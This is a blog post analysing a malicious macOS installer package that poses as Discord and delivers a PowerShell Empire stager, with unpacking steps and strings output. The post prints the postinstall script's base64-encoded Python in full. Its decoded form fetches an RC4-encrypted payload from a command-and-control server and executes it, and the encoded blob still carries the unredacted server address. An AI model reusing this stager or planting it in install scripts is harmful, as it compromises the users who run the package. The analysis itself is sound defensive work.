---
layout: post
title: "Analyzing an Empire macOS PKG Stager"
date: 2021-02-08
categories: macOS Empire PKG malware 
permalink: /analyzing-empire-macos-pkg-stager/
---

Command and control (C2) frameworks often support multiple platforms, and PowerShell Empire is no different. In older days, there was a Python Empyre version that eventually merged into the full Empire project and support for macOS and Linux systems still exists within Empire. For these platforms, Empire leverages python-based launchers to execute commands. While the Python launchers may be platform independent, adversaries must still deliver them to victim hosts. This delivery presents an excellent opportunity for detection and analysis. For this example, we're going to walk through the analysis of an Empire stager found in VirusTotal: [https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection](https://www.virustotal.com/gui/file/19e19adc03b313236462b30a1a438a604d4c0b4c86268b951689696144a63fdc/detection).

## Inspecting The PKG File

For this analysis, we'll work from a REMnux v7 host. To start off, let's make sure we have a working folder for files.

```shell
$ mkdir -p ~/cases/empire-stager/stager
$ mv ~/Downloads/discord.pkg empire-stager/
$ cd empire-stager/
$ ls -lah

total 48K
drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 .
drwxrwxr-x 9 remnux remnux 4.0K Feb  8 23:37 ..
-rw-rw-r-- 1 remnux remnux  35K Feb  7 01:30 discord.pkg
drwxrwxr-x 2 remnux remnux 4.0K Feb  8 23:37 stager
```

The PKG file masquerades as a component related to the Discord application, possibly the installer. To proceed we can go ahead and get an idea of the file type using the `file` command.

```shell
$ file discord.pkg

discord.pkg: xar archive compressed TOC: 2674, SHA-1 checksum
```

The output indicates the PKG file is a XAR archive, exactly what we expect for a PKG file.

Moving forward, we can unpack the PKG using `bsdtar`.

```shell
$ bsdtar xvf discord.pkg -C stager/

x Resources
x Resources/ru-RU.lproj
x Distribution
x update.pkg
x update.pkg/PackageInfo
x update.pkg/Bom
x update.pkg/Payload
x update.pkg/Scripts

$ cd stager/
$ ls -lah

total 20K
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 .
drwxrwxr-x 3 remnux remnux 4.0K Feb  8 23:38 ..
-rw-r--r-- 1 remnux remnux 1.8K Nov 27  2019 Distribution
drwxr-xr-x 3 remnux remnux 4.0K Nov 27  2019 Resources
drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 update.pkg
```

Within the Resources folder there is a `ru-RU.lproj` file. From the naming convention we can hypothesize it has something to do with language resources, but we can't be sure because the folder is empty upon inspection.

Next, we can inspect the contents of the `update.pkg` folder. As seen in the output of `bsdtar`, it contains just a few files:

```shell
$ ls -lah

total 84K
drwxr-xr-x 2 remnux remnux 4.0K Nov 27  2019 .
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
-rw-r--r-- 1 remnux remnux  35K Nov 27  2019 Bom
-rw-r--r-- 1 remnux remnux  777 Nov 27  2019 PackageInfo
-rw-r--r-- 1 remnux remnux  29K Nov 27  2019 Payload
-rw-r--r-- 1 remnux remnux  917 Nov 27  2019 Scripts

$ file *

Bom:         Mac OS X bill of materials (BOM) file
PackageInfo: ASCII text
Payload:     gzip compressed data, from Unix, original size modulo 2^32 77824
Scripts:     gzip compressed data, from Unix, original size modulo 2^32 1536
```

From the directory structure and file types, it seems the contents match what we would expect from a macOS PKG file. There is a Bill of Materials (BOM) file, PackageInfo in text/XML format, and two gzipped CPIO archives: Payload and Scripts. Before unpacking the Payload and Scripts, we can inspect the PackageInfo file with `less`.

```shell
$ less PackageInfo

<pkg-info format-version="2" identifier="com.apple.Discord" version="1.0" install-location="/" auth="root" overwrite-permissions="true" generator-version="InstallCmds-554 (15G31)">
    <payload numberOfFiles="15" installKBytes="105"/>
    <scripts>
        <postinstall file="./postinstall"/>
    </scripts>
    <bundle id="com.apple.Discord" CFBundleIdentifier="com.apple.Discord" path="./Discord.app" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
    <bundle-version>
        <bundle id="com.apple.Discord"/>
    </bundle-version>
    <upgrade-bundle>
        <bundle id="com.apple.Discord"/>
    </upgrade-bundle>
    <update-bundle/>
    <atomic-update-bundle/>
    <strict-identifier>
        <bundle id="com.apple.Discord"/>
    </strict-identifier>
</pkg-info>
```

There are a few things to note from this file. First, the PackageInfo file doubles down on the masquerade that the PKG file is related to Discord. Next, the `installKBytes` field contains a value `105`. This gives us reasonable evidence to assume the Payloads archive will contain some form of content. In payload-free package files, the `installKBytes` field will contain the value `0`, indicating all the work is done by preinstall and postinstall scripts.

Finally, the `scripts` section of the PackageInfo file indicates we can expect Scripts to unpack a postintall script for execution. This postinstall script should execute after the macOS Installer utility processes the content of the PKG file and after the "installation" is complete. In legitimate use cases, applications would take this opportunity to use postinstall scripts to clean up unneeded files. In this case, the postinstall script executes malware.

## Unpacking the Malicious Content

Now we can unpack the Payload and Scripts archives.

```shell
$ cat Payload | gunzip | cpio -i
152 blocks
$ cat Scripts | gunzip | cpio -i
3 blocks

$ ls -lah
total 92K
drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 .
drwxrwxr-x 4 remnux remnux 4.0K Feb  8 23:44 ..
drwxr-xr-x 3 remnux remnux 4.0K Feb  9 00:01 Applications
-rw-r--r-- 1 remnux remnux  35K Nov 27  2019 Bom
-rw-r--r-- 1 remnux remnux  777 Nov 27  2019 PackageInfo
-rw-r--r-- 1 remnux remnux  29K Nov 27  2019 Payload
-rwxr-xr-x 1 remnux remnux 1.1K Feb  9 00:01 postinstall
-rw-r--r-- 1 remnux remnux  917 Nov 27  2019 Scripts

$ file postinstall 
postinstall: Bourne-Again shell script, ASCII text executable, with very long lines
```

Now the postinstall script is unpacked, we can recognize its file type as a Bash script. This is important to note as a postinstall script can be written in any scripting language for which the system contains an interpreter. In some packages, I've also seen postinstall to be a Mach-O binary instead of a script. To see the contents of postinstall, we can use the `less` command again.

```shell
$ less postinstall

#!/bin/bash

echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ=='));" | /usr/bin/python &

exit 0
```

The postinstall script contains base64-encoded Python commands. We know they're base64-encoded because they'll be decoded at runtime using the functions `base64.b64decode` and executed with `exec`. In addition, the stager uses an `echo` command to pass the code into a `python` process. This is an evasion method, ensuring that process monitoring software such as EDR won't notice Python having suspicious command line parameters. Since the code is in base64, we can easily decode it with the command `base64 -d` and write it to a plaintext file.

```shell
$ echo "aW1wb3J0IHN5cztpbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xNzYuMTI2LjcwLjEzMjoxMDAwMSc7dD0nL2xvZ2luL3Byb2Nlc3MucGhwJztyZXE9dXJsbGliMi5SZXF1ZXN0KHNlcnZlcit0KTsKcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLFVBKTsKcmVxLmFkZF9oZWFkZXIoJ0Nvb2tpZScsInNlc3Npb249cUc5WlFZWFdlMEk1cG15dFpFMU4wdkFxbTljPSIpOwpwcm94eSA9IHVybGxpYjIuUHJveHlIYW5kbGVyKCk7Cm8gPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihwcm94eSk7CnVybGxpYjIuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliMi51cmxvcGVuKHJlcSkucmVhZCgpOwpJVj1hWzA6NF07ZGF0YT1hWzQ6XTtrZXk9SVYrJzBlZjk2NzMyNzg5NzE4NTI1ZTc2MzgyOTM3MGJkNDg4JztTLGosb3V0PXJhbmdlKDI1NiksMCxbXQpmb3IgaSBpbiByYW5nZSgyNTYpOgogICAgaj0oaitTW2ldK29yZChrZXlbaSVsZW4oa2V5KV0pKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIob3JkKGNoYXIpXlNbKFNbaV0rU1tqXSklMjU2XSkpCmV4ZWMoJycuam9pbihvdXQpKQ==" | base64 -d > python-stager.txt
```

## Analyzing The Python Code

```shell
$ less python-stager.txt

import sys;import urllib2;
UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';server='hxxp://176.126.70[.]xxx:10001';t='/login/process.php';req=urllib2.Request(server+t);
req.add_header('User-Agent',UA);
req.add_header('Cookie',"session=qG9ZQYXWe0I5pmytZE1N0vAqm9c=");
proxy = urllib2.ProxyHandler();
o = urllib2.build_opener(proxy);
urllib2.install_opener(o);
a=urllib2.urlopen(req).read();
IV=a[0:4];data=a[4:];key=IV+'0ef96732789718525e763829370bd488';S,j,out=range(256),0,[]
for i in range(256):
    j=(j+S[i]+ord(key[i%len(key)]))%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
exec(''.join(out))
```

While inspecting the Python code, we can note a few things for leads. First, the C2 server for this implant is at 176.126.70.xxx (intentionally redacted) on port 10001 listening for the HTTP protocol. When visiting the C2 server for commands, the code will request a URI path of `/login/process.php` using a user-agent string of `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko`. Both of these details help Empire's network traffic masquerade as legitimate traffic in an enterprise network.

With this cleartext code, we can easily attribute the code to Empire with code publicly available on GitHub. In this case, the Python code comes from this file in the former, archived Empire repository: [https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413](https://github.com/EmpireProject/Empire/blob/master/lib/listeners/http.py#L413).

The PKG stager packaging is also in the repository here: [https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404](https://github.com/EmpireProject/Empire/blob/master/lib/common/stagers.py#L404).

## Does The App Even Do Anything?

From here we're certain the PKG file contains an Empire stager, but it could also potentially contain legitimate functionality related to Discord. We can rule that out by investigating the rest of the PKG contents.

```shell
$ cd Applications/Discord.app/
$ tree -a
.
└── Contents
    ├── _CodeSignature
    │   └── CodeResources
    ├── Info.plist
    ├── MacOS
    │   └── Discord
    ├── PkgInfo
    └── Resources
        ├── Base.lproj
        │   └── MainMenu.nib
        └── Scatter.icns

5 directories, 6 files
```

Using the `tree` command, we can inspect the folder structure without all the laborious `ls` commands. Within macOS application bundles, the main executable of interest typically lives in the Contents/MacOS folder. In this case, it's named Discord.

```shell
$ cd Contents/MacOS/
$ file Discord 
Discord: Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>
```

From the output of `file` we know that Discord is definitely a Mach-O executable binary. We're not going to fully reverse the binary, but we can get some additional evidence by simply running `strings` to see if we can identify suspicious binary contents. First, we'll run `strings` to get standard ASCII characters into a file. Then, we'll re-run `strings` again, targeting the Unicode characters.

```shell
$ strings Discord > discord.strings.txt
$ strings -el Discord >> discord.strings.txt 

$ less discord.strings.txt

__PAGEZERO
__TEXT
__text
__TEXT
__const
__TEXT
__unwind_info
__TEXT
__DATA
__objc_imageinfo__DATA
__LINKEDIT
/usr/lib/dyld
/System/Library/Frameworks/Python.framework/Versions/2.7/Python
/System/Library/Frameworks/Foundation.framework/Versions/C/Foundation
/usr/lib/libobjc.A.dylib
/usr/lib/libSystem.B.dylib
@(#)PROGRAM:templateMachoExe  PROJECT:templateMachoExe-
_mh_execute_header
:main
>templateMachoExeVersion
String
UNumber
__mh_execute_header
_main
_templateMachoExeVersionNumber
_templateMachoExeVersionString
dyld_stub_binder
templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
PC^t
templateMachoExe-555549440018c666ecdc32b59bfb39f5a574c24d
@DxG
```

It's not common to see a functional binary quite this lean in strings. In fact, there doesn't appear to be anything in the binary specifically relevant to Discord in any way. An additional lead to investigate is the string `templateMachoExe` present in the `strings` output. This string could indicate the binary is a generic copy of the template Mach-O file contained with Empire. To find out for sure, you can download the [template file](https://github.com/EmpireProject/Empire/blob/master/data/misc/machotemplate) and run `strings` against it to compare the output.

Hopefully this helps illustrate how Empire stagers work on macOS, thanks for reading!


